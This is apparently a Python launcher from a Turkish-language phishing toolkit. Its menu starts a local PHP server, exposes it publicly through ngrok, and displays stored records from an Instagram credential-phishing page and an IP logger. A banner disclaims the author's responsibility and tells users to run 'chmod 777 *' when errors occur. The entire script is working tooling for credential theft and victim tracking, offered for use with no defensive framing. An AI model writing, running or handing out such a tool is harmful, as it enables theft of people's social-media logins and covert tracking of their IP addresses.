import os
os.system("clear")
print("\033[94m")
uyari = open("oltalama/ngrok-uyari.txt")
print(uyari.read())
uyari.close()
print("\033[95m")
print('''Yaptığınız ve yapacağınız her şeyden siz sorumlusunuz.
		         Sexettin asla sorumluluk kabul etmez. 
       ,--.--._			4 haneli port örneği: 1515
------" _, \___)
        / _/____) 1-) Link Oluştur
        \//(____)
------\     (__)  2-) Instagram Oltalama Kayıtlarına Bak (index.php)
       `-----/		
        	  3-) Ip Logger Kayıtlarına Bak (index2.php)

		Ngrok hata verirse veya permission denied hatası alırsanız
			chmod 777 * 	yazın 
''')
oltalama = input("Seçim Yapınız > ")
if(oltalama=="1"):
	phport = input("4 Haneli Port Giriniz > ")
	os.system("php -S 127.0.0.1:"+phport+" &")
	os.system("/n")
	os.system("./ngrok http "+phport)

elif(oltalama=="2"):
	kayit = open("oltalama/kayitlar.txt")
	print(kayit.read())
	kayit.close()

elif(oltalama=="3"):
	kayit = open("oltalama/ip-kayitlar.txt")
	print(kayit.read())
	kayit.close()

